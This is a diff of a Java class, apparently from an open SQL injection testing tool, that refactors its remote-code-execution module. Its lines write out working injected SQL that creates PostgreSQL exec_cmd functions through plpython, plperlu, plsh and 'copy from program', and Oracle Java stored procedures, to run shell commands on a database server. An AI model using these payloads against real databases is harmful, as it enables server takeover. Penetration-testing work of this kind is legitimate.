@@ -39,6 +39,11 @@ public class UdfAccess {
     private static final String RCE_JAVA_UTIL_SRC = "RCE_JAVA_UTIL_SRC";
     private static final String RCE_JAVA_UTIL_FUNC = "RCE_JAVA_UTIL_FUNC";
     private static final String BEGIN = "BEGIN";
+    private static final String ADD_FUNC = "body#add-func";
+    private static final String BODY_CONFIRM = "body#confirm";
+    private static final String RCE_RUN_CMD = "rce#run-cmd";
+    // TODO should redirect error directly to default output
+    public static final String TEMPLATE_ERROR = "Command failure: %s\nTry '%s 2>&1' to get a system error message.\n";
 
     private final InjectionModel injectionModel;
     private final BiPredicate<String, String> biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -> {
@@ -87,23 +92,26 @@ public class UdfAccess {
                 "from subprocess import check_output as c",
                 "return c(cmd).decode()",
                 "$$%20LANGUAGE "+ this.nameExtension +";"
-            ), "body#add-func");
+            ), UdfAccess.ADD_FUNC);
         } else if (this.nameExtension.startsWith("plperlu")) {
             this.injectionModel.injectWithoutIndex(
-                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;"
-            , "body#add-func");
+                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;",
+                UdfAccess.ADD_FUNC
+            );
         } else if (this.nameExtension.startsWith("plsh")) {
             this.injectionModel.injectWithoutIndex(
-                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS '%23!/bin/sh%0a$1' LANGUAGE plsh;"
-            , "body#add-func");
+                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS '%23!/bin/sh%0a$1' LANGUAGE plsh;",
+                UdfAccess.ADD_FUNC
+            );
         } else if (this.nameExtension.startsWith("sql")) {
             this.injectionModel.injectWithoutIndex(";DROP TABLE IF EXISTS cmd_result;", "body#drop-tbl");
             this.injectionModel.injectWithoutIndex(";Create table cmd_result (str text);", "body#add-tbl");
             this.injectionModel.injectWithoutIndex(
                 ";Create Or Replace Function exec_cmd() RETURNS void As%20$$%20copy cmd_result from program 'echo%20\"13\"\"37\"'$$%20language sql;",
-            "body#add-func");
+                UdfAccess.ADD_FUNC
+            );
             this.injectionModel.injectWithoutIndex(";select exec_cmd();", "body#run-func");
-            var result = this.getResult("select array_to_string(array(select str FROM cmd_result),'')", "body#confirm");
+            var result = this.getResult("select array_to_string(array(select str FROM cmd_result),'')", UdfAccess.BODY_CONFIRM);
             if (!"1337".equals(result)) {
                 return;
             }
@@ -111,7 +119,7 @@ public class UdfAccess {
 
         var functions = this.getResult(
             "SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'",
-            "body#confirm"
+            UdfAccess.BODY_CONFIRM
         );
         if (!functions.contains("exec_cmd")) {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: function not found");
@@ -127,7 +135,7 @@ public class UdfAccess {
     }
 
     private String createExtension(String nameExtension) throws JSqlException {
-        LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Checking extension "+ nameExtension);
+        LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Checking extension {}", nameExtension);
         this.injectionModel.injectWithoutIndex(";CREATE EXTENSION "+ nameExtension +";", "body#add-ext");
         String languages = this.getResult(
             "select array_to_string(array(select lanname FROM pg_language),'')",
@@ -158,17 +166,20 @@ public class UdfAccess {
             "\\n",
             "END;"
         )), "body#add-src");
-        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-            UdfAccess.BEGIN,
-            "\\n",
-            "EXECUTE IMMEDIATE 'create or replace function ",
-            UdfAccess.RCE_JAVA_UTIL_FUNC,
-            "(p_cmd in varchar2) return varchar2 as language java name ''",
-            UdfAccess.RCE_JAVA_UTIL_SRC,
-            ".runCmd(java.lang.String) return String'';';",
-            "\\n",
-            "END;"
-        )), "body#add-func");
+        this.injectionModel.injectWithoutIndex(
+            String.format(pattern, String.join(StringUtils.EMPTY,
+                UdfAccess.BEGIN,
+                "\\n",
+                "EXECUTE IMMEDIATE 'create or replace function ",
+                UdfAccess.RCE_JAVA_UTIL_FUNC,
+                "(p_cmd in varchar2) return varchar2 as language java name ''",
+                UdfAccess.RCE_JAVA_UTIL_SRC,
+                ".runCmd(java.lang.String) return String'';';",
+                "\\n",
+                "END;"
+            )),
+            ADD_FUNC
+        );
         this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
             UdfAccess.BEGIN,
             "\\n",
@@ -182,7 +193,7 @@ public class UdfAccess {
                 VendorYaml.TRAIL_SQL,
                 UdfAccess.RCE_JAVA_UTIL_FUNC
             ),
-            "body#confirm"
+            UdfAccess.BODY_CONFIRM
         );
         if (!nameDatabase.contains(UdfAccess.RCE_JAVA_UTIL_FUNC)) {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: java function not found");
@@ -418,10 +429,10 @@ public class UdfAccess {
                     command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                     VendorYaml.TRAIL_SQL
                 ),
-                "rce#run-cmd"
+                UdfAccess.RCE_RUN_CMD
             );
         } catch (JSqlException e) {
-            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+            result = String.format(UdfAccess.TEMPLATE_ERROR, e.getMessage(), command);
         }
         var request = new Request();
         request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
@@ -437,8 +448,9 @@ public class UdfAccess {
                 this.injectionModel.injectWithoutIndex(";delete from cmd_result;", "body#empty-tbl");
                 this.injectionModel.injectWithoutIndex(
                     ";Create Or Replace Function exec_cmd() RETURNS void As%20$$%20copy cmd_result from program '"+ command.replace(StringUtils.SPACE, "%20") +"'$$%20language sql;",
-                "body#add-func");
-                this.injectionModel.injectWithoutIndex(";select exec_cmd();", "rce#run-cmd");
+                    UdfAccess.ADD_FUNC
+                );
+                this.injectionModel.injectWithoutIndex(";select exec_cmd();", UdfAccess.RCE_RUN_CMD);
                 result = this.getResult("select array_to_string(array(select str FROM cmd_result),'\\n')||'"+ VendorYaml.TRAIL_SQL +"'", "body#result") +"\n";
             } else {
                 result = this.getResult(
@@ -447,11 +459,11 @@ public class UdfAccess {
                         command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                         VendorYaml.TRAIL_SQL
                     ),
-                    "rce#run-cmd"
+                    UdfAccess.RCE_RUN_CMD
                 );
             }
         } catch (JSqlException e) {
-            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+            result = String.format(UdfAccess.TEMPLATE_ERROR, e.getMessage(), command);
         }
         var request = new Request();
         request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
@@ -468,7 +480,7 @@ public class UdfAccess {
                 "udf#run-cmd"
             );
         } catch (JSqlException e) {
-            result = "Command failure: "+ e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+            result = String.format(UdfAccess.TEMPLATE_ERROR, e.getMessage(), command);
         }
         var request = new Request();
         request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);
